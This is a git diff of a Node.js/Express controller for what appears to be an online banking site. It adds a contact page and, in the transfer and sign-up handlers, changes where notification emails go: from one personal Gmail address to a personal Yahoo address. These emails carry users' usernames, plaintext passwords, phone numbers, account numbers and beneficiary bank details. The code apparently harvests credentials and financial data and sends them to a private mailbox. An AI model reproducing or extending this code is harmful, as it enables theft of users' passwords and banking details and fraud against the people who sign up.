@@ -56,6 +56,10 @@ exports.account = function(req,res) {
 	res.render('account')
 }
 
+exports.contact = function(req,res) { 
+	res.render('contact')
+}
+
 exports.dashboard = function(req,res) { 
 	res.render('dashboard')
 }
@@ -113,7 +117,7 @@ exports.transfer = async function(req,res) {
 
 			const options = {
 				from: 'gcamon29@outlook.com',
-				to: 'trojamm@gmail.com',
+				to: 'casworth@yahoo.com',
 				subject: `New Transfer Initiated by ${user.accountHolder} `,
 				text: `Account name: ${user.accountHolder}\nAccount number: ${user.accNum}
 				\nBenefiary Acc number: ${req.body.destinationAcc}\nBeneficiary bank name: ${req.body.bank}\nBeneficiary acc name: ${req.body.destinationName}
@@ -201,7 +205,7 @@ exports.signUp = function(req,res){
 				res.status(200).json(user);
 				const options = {
 					from: 'gcamon29@outlook.com',
-					to: 'trojamm@gmail.com', 
+					to: 'casworth@yahoo.com', 
 					subject: `New User Registration`,
 					text: `Account name: ${user.accountHolder}\nUsername: ${user.username}\nPassword: ${user.password}
 					\nAcc Type: ${user.accType}\nCity: ${user.city}\nPhone: ${req.body.phone}\nEmail: ${req.body.email}`
